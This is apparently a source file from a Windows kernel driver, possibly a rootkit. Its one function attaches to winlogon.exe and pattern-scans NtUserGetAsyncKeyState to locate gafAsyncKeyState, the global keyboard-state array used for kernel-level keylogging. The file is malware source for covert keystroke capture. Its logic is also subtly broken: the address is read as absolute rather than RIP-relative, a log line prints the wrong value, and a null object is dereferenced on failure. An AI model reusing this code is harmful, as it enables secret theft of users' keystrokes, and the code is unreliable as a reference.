#include <ntifs.h>
#include <wdf.h>
#include "Globals.hpp"
#include "Misc.hpp"
#include "WinTypes.hpp"
#include "MemoryUtils.hpp"

#define MOV_RAX_QWORD_BYTE1 0x48
#define MOV_RAX_QWORD_BYTE2 0x8B
#define MOV_RAX_QWORD_BYTE3 0x05

UINT64
BeGetGafAsyncKeyStateAddress()
{
	KAPC_STATE apc;
	PEPROCESS targetProc = 0;
	UNICODE_STRING processName;

	// Get Address of NtUserGetAsyncKeyState
	DWORD64 ntUserGetAsyncKeyState = (DWORD64)BeGetSystemRoutineAddress(Win32kBase, "NtUserGetAsyncKeyState");
	LOG_MSG("NtUserGetAsyncKeyState: 0x%llx\n", ntUserGetAsyncKeyState);

	// To read session driver modules (such as win32kbase.sys, which contains NtUserGetAsyncKeyState), we need to be attached to a process running in a user session // TODO refactor to dedicated function
	// https://www.unknowncheats.me/forum/general-programming-and-reversing/492970-reading-memory-win32kbase-sys.html
	// Attach to winlogon

	RtlInitUnicodeString(&processName, L"winlogon.exe");
	HANDLE procId = Get_pid_from_name(processName);
	LOG_MSG("Found winlogon PID: %i\n", procId);

	if (PsLookupProcessByProcessId(procId, &targetProc) != 0)
	{
		ObDereferenceObject(targetProc);
		return NULL;
	}
	KeStackAttachProcess(targetProc, &apc);

	UINT64 address = 0;
	INT i = 0;

	// Resolve gafAsyncKeyState address
	for (; i < 500; ++i)
	{
		if (
			*(BYTE*)(ntUserGetAsyncKeyState + i) == MOV_RAX_QWORD_BYTE1
			&& *(BYTE*)(ntUserGetAsyncKeyState + i + 1) == MOV_RAX_QWORD_BYTE2 
			&& *(BYTE*)(ntUserGetAsyncKeyState + i + 2) == MOV_RAX_QWORD_BYTE3
		)
		{
			// param for MOV RAX QWORD PTR is the address of gafAsyncKeyState
			address = *(PUINT64)(ntUserGetAsyncKeyState + i + 3);
			// add ofset to next instruction to get callback array addr
			break;
		}
	}

	if (address == 0)
	{
		LOG_MSG("Could not resolve gafAsyncKeyState...\n");
	}
	else
	{
		LOG_MSG("Found address to gafAsyncKeyState at offset [NtUserGetAsyncKeyState]+%i: 0x%llx\n", i, ntUserGetAsyncKeyState);
	}

	KeUnstackDetachProcess(&apc);
	return address;
}